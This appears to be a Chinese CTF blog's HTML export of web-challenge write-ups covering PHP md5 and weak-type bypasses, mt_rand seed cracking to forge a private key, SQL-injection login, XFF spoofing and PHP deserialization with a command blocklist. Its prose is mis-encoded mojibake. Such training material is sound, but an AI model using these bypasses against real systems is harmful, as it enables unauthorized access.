title="Ez_bypass"></a>Ez_bypass</h2><p>æ¯”è¾ƒç®€å•çš„ä»£ç å®¡è®¡é¢˜</p><p><img src="/2021/09/28/buu/24/image-20210929155243165.png" alt="image-20210929155243165"></p><p>æ•´ç†ä¸€ä¸‹ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">I put something in F12 for you</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#39;You can not get it !&#39;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#39;only one way to get the flag&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#39;Please input first&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>å¼€å¤´çœ‹åˆ°ååˆ†ç†Ÿæ‚‰çš„include</p><p>å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªé¡µé¢å¯ä»¥æ‰“å°å‡ºå’Œflag.phpé‡Œä¸€æ ·çš„å˜é‡å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br></pre></td></tr></table></figure><h4 id="MD5å€¼ç›¸åŒçš„å˜é‡"><a href="#MD5å€¼ç›¸åŒçš„å˜é‡" class="headerlink" title="MD5å€¼ç›¸åŒçš„å˜é‡"></a>MD5å€¼ç›¸åŒçš„å˜é‡</h4><p>ç¬¬ä¸€å±‚ï¼Œè¦æ±‚GETä¼ å…¥å˜é‡ggå’Œidï¼Œä¸¤ä¸ªå˜é‡çš„å€¼ä¸åŒä½†æ˜¯md5å€¼è¦ç›¸åŒ</p><p>è‡ªç„¶æƒ³åˆ°æ•°ç»„ç»•è¿‡ï¼ˆä¹Ÿå¯ä»¥å»æ‰¾0eå¼€å¤´MD5ç›¸åŒçš„ä¸€ç»„å€¼ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?gg[]&#x3D;1&amp;id[]&#x3D;2</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210929155726680.png" alt="image-20210929155726680"></p><p>çœ‹ç¬¬äºŒä¸ª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure><h4 id="PHPå¼±ç±»å‹"><a href="#PHPå¼±ç±»å‹" class="headerlink" title="PHPå¼±ç±»å‹"></a>PHPå¼±ç±»å‹</h4><p>è¿™é‡Œè€ƒå¯Ÿäº†phpå¼±ç±»å‹çš„çŸ¥è¯†</p><p>å½“ä¼ å…¥å­—ç¬¦ä¸²æ—¶ï¼Œ==ä¼šå¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—å†è¿›è¡Œæ¯”è¾ƒ</p><p>æ‰€ä»¥POSTä¼ å‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd&#x3D;1234567a</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210929160016795.png" alt="image-20210929160016795"></p><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p><img src="/2021/09/28/buu/24/image-20210929161638378.png" alt="image-20210929161638378"></p><p>å¼€å¹•é›·å‡»ï¼Œdoge</p><p>å“ˆå“ˆå…¶å®æ˜¯æˆ‘å­¦çˆ¬è™«çš„è§†é¢‘ä»‹ç»ç½‘ç«™æ¨¡æ¿çš„æ—¶å€™å°±æ˜¯è·Ÿè¿™ä¸ªåŒä¸€å®¶ï¼Œå¾ˆäº²åˆ‡</p><p>å‘ç°é¡µé¢ä¸å¤ªå‹å¥½ï¼Œæ²¡æœ‰ä»»ä½•æç¤º</p><h4 id="æºç æ³„éœ²"><a href="#æºç æ³„éœ²" class="headerlink" title="æºç æ³„éœ²"></a>æºç æ³„éœ²</h4><p>dirsearchæ‰«ä¸€ä¸‹ï¼Œæœ‰æºç æ³„éœ²ï¼š<a href="http://www.zip/">www.zip</a></p><p>ä¸‹è½½ä¸‹æ¥å¾—åˆ°index.phpçš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>ä»£ç é‡Œå‘Šè¯‰äº†æˆ‘ä»¬ä¸€ä¸ªé¡µé¢ï¼šlogin.html</p><p>è®¿é—®çœ‹ä¸€ä¸‹ï¼š</p><p><img src="/2021/09/28/buu/24/image-20210929161956786.png" alt="image-20210929161956786"></p><p>åˆ†æäº†ä¸€ä¸‹ä»£ç </p><p>ç”¨æˆ·åå’Œå¯†ç ã€ç§é’¥éƒ½ä¸èƒ½ä¸ºç©º</p><p>æŒ‰ç…§ç¬¬ä¸‰æ®µåˆ¤æ–­ï¼Œ</p><p>ç”¨æˆ·åä¸ºcrisprï¼Œå¯†ç é‚£é‡Œå¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„å•å¼•å·SQLæ³¨å…¥æ¼æ´</p><p>éš¾çš„å°±æ˜¯ç§é’¥å•Šå•Šå•Š</p><h4 id="ç›´æ¥å€Ÿç”¨Y1ngå¤§ä½¬çš„è¿‡ç¨‹"><a href="#ç›´æ¥å€Ÿç”¨Y1ngå¤§ä½¬çš„è¿‡ç¨‹" class="headerlink" title="ç›´æ¥å€Ÿç”¨Y1ngå¤§ä½¬çš„è¿‡ç¨‹"></a>ç›´æ¥å€Ÿç”¨Y1ngå¤§ä½¬çš„è¿‡ç¨‹</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;</span><br><span class="line">    char *str2 &#x3D; &quot;KVQP0LdJKRaV3n9D&quot;; &#x2F;&#x2F;å…¬é’¥</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; 0; i &lt; strlen(str2) ; i++) &#123;</span><br><span class="line">        for (int j &#x3D; 0; j &lt; strlen(str1) ; j++) &#123;</span><br><span class="line">            if ( str2[i] &#x3D;&#x3D; str1[j] ) &#123;</span><br><span class="line">                printf(&quot;%d %d 0 %d &quot;, j, j, strlen(str1)-1);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210929162312335.png" alt="image-20210929162312335"></p><p><img src="/2021/09/28/buu/24/image-20210929162350213.png" alt="image-20210929162350213"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(1775196155);</span><br><span class="line"></span><br><span class="line">function public_key($length &#x3D; 16) &#123;</span><br><span class="line">    $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $public_key &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;genarate private_key</span><br><span class="line">function private_key($length &#x3D; 12) &#123;</span><br><span class="line">    $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $private_key &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">&#125;</span><br><span class="line">$Public_key &#x3D; public_key();</span><br><span class="line">$y1ng &#x3D; private_key();</span><br><span class="line">echo $Public_key . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $y1ng;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç§é’¥ï¼šXuNhoueCDCGc</p><p>æœ‰äº†è¿™ä¸ªï¼Œå˜¿å˜¿å˜¿ï¼Œå¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†ï¼ˆä¸æ˜¯ï¼‰</p><h4 id="ä¸‡èƒ½å¯†ç "><a href="#ä¸‡èƒ½å¯†ç " class="headerlink" title="ä¸‡èƒ½å¯†ç "></a>ä¸‡èƒ½å¯†ç </h4><p>ä¸‡èƒ½å¯†ç èµ°èµ·</p><p><img src="/2021/09/28/buu/24/image-20210929162457871.png" alt="image-20210929162457871"></p><p>ç™»å½•åï¼š</p><p><img src="/2021/09/28/buu/24/image-20210929162522508.png" alt="image-20210929162522508"></p><h2 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h2><p>å•Šï¼Œè¿™é¢˜æ„Ÿè§‰æœ‰ç‚¹å°æ— è¯­</p><p><img src="/2021/09/28/buu/24/image-20210929163657423.png" alt="image-20210929163657423"></p><p>è¿›å»ä¹‹åå‘ç°è¢«å‡ºé¢˜äººç–¯ç‹‚å˜²è®½</p><p><img src="/2021/09/28/buu/24/image-20210929163738713.png" alt="image-20210929163738713"></p><p>æ‰«è¿™ä¸ªå°±è¢«å˜²è®½è¿˜æƒ³pyï¼Ÿ</p><h4 id="md5å¤±è´¥"><a href="#md5å¤±è´¥" class="headerlink" title="md5å¤±è´¥"></a>md5å¤±è´¥</h4><p>è€è€å®å®å›å»é¡µé¢</p><p><img src="/2021/09/28/buu/24/image-20210929163835193.png" alt="image-20210929163835193"></p><p>æºç é‡Œçœ‹åˆ°è¿™æ®µä»£ç </p><p>æˆ‘è¯•äº†åŠå¤©çš„md5åŠ å¯†ï¼Œç»“æœwpå’Œæˆ‘è¯´è¿™ï¼Œæ˜¯ï¼Œè§£ï¼Œä¸ï¼Œå‡ºï¼Œæ¥ï¼Œçš„ï¼</p><p>ç›´æ¥è®¿é—®/flag.phpå°±å¯ä»¥äº†ï¼ˆä¸äº‰æ°”çš„æ³ªæ°´æµäº†ä¸‹æ¥ï¼‰</p><p><img src="/2021/09/28/buu/24/image-20210929164028325.png" alt="image-20210929164028325"></p><p>ç„¶åå°±æ˜¯è¿™ä¸ªå¸…æ°”çš„è¡¨æƒ…åŒ…</p><p>åˆ°è¿™è¾¹å®Œå…¨æ²¡æœ‰æ€è·¯</p><h4 id="å¤§ä½¬çš„è§£é¢˜"><a href="#å¤§ä½¬çš„è§£é¢˜" class="headerlink" title="å¤§ä½¬çš„è§£é¢˜"></a>å¤§ä½¬çš„è§£é¢˜</h4><p>Y1ngå¤§ä½¬è¯´æ˜¯å»çœ‹jsæ–‡ä»¶</p><p>å‘ç°lib/php-mail-form/validate.jsä¸­çš„ JQuery ä¼šå‘ä¸€ä¸ª POST è¯·æ±‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var action &#x3D; $(this).attr(&#39;action&#39;);</span><br><span class="line">    if( ! action ) &#123;</span><br><span class="line">      action &#x3D; &#39;contactform&#x2F;contactform.php&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var this_form &#x3D; $(this);</span><br><span class="line">    this_form.find(&#39;.sent-message&#39;).slideUp();</span><br><span class="line">    this_form.find(&#39;.error-message&#39;).slideUp();</span><br><span class="line">    this_form.find(&#39;.loading&#39;).slideDown();</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">      type: &quot;POST&quot;,</span><br><span class="line">      url: action,</span><br><span class="line">      data: str,</span><br><span class="line">      success: function(msg) &#123;</span><br><span class="line">        if (msg &#x3D;&#x3D; &#39;OK&#39;) &#123;</span><br><span class="line">          this_form.find(&#39;.loading&#39;).slideUp();</span><br><span class="line">          this_form.find(&#39;.sent-message&#39;).slideDown();</span><br><span class="line">          this_form.find(&quot;input, textarea&quot;).val(&#39;&#39;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          this_form.find(&#39;.loading&#39;).slideUp();</span><br><span class="line">          this_form.find(&#39;.error-message&#39;).slideDown().html(msg);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¯·æ±‚çš„ç›®æ ‡ contactform/contactform.php æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ€€ç–‘å‡ºé¢˜äººå‰æ®µä¸€é”®ç™½å«–çš„æ—¶å€™æ²¡æœ‰ä»”ç»†æ£€æŸ¥ã€‚</p><p>è®¿é—® flag.php å‘Šè¯‰è¿˜æ²¡ä¹°ï¼Œå·²ç»è®°å½•äº†è´­ä¹°è€…çš„ ip</p><p>åˆ†æä»£ç å¯çŸ¥å‰æ®µé‚£ä¸ªæˆæƒç éªŒè¯è‚¯å®šæ˜¯æ— æ•ˆçš„ï¼ˆå°±ç®—éªŒè¯é€šè¿‡åç«¯ä¹Ÿä¸çŸ¥é“ï¼‰ï¼Œæ‰€ä»¥è´­ä¹° flag è‚¯å®šæ˜¯å‡çš„ã€‚å› ä¸ºè®°å½•äº†è´­ä¹°è€…çš„ ipï¼Œæ‰€ä»¥ XFF ä¼ªé€ ä¸€ä¸‹ï¼Œå¾—åˆ° flag</p><p><img src="/2021/09/28/buu/24/image-20210929164307294.png" alt="image-20210929164307294"></p><p><img src="/2021/09/28/buu/24/image-20210929164320367.png" alt="image-20210929164320367"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF hellounser</title>
      <link href="/2021/09/25/buu/23/"/>
      <url>/2021/09/25/buu/23/</url>
      
        <content type="html"><![CDATA[<p> æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line">    <span class="keyword">public</span> $arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="keyword">$this</span>-&gt;func) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="keyword">$this</span>-&gt;arg)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            $func(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    $aaa = unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    $aaa();</span><br><span class="line">&#125;</span><br><span class="line"><span 